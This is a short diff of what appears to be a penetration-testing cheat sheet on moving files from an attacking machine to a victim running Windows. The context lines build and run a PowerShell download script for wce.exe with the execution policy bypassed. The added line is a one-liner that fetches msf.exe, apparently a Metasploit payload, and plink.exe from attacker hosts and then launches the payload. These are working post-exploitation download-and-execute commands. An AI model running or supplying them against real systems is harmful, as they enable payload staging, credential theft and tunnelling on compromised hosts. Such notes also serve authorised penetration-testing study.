@@ -5,6 +5,8 @@ echo $url = "http://192.168.56.1/wce.exe" >>wget.ps1
 echo $file = "wce.exe" >>wget.ps1
 echo $webclient.DownloadFile($url,$file) >>wget.ps1
 
+cmd /c "PowerShell (New-Object System.Net.WebClient).DownloadFile ('http://$IP/msf.exe','msf.exe');(New-Object System.Net.WebClient).DownloadFile ('http://192.168.44.137/plink.exe','plink.exe');Start-Process 'msf.exe'"
+
 powershell.exe -ExecutionPolicy Bypass -NoLogo -NonInteractive -NoProfile -File wget.ps1
 
 # Transfer file from attacking box to victim in one line
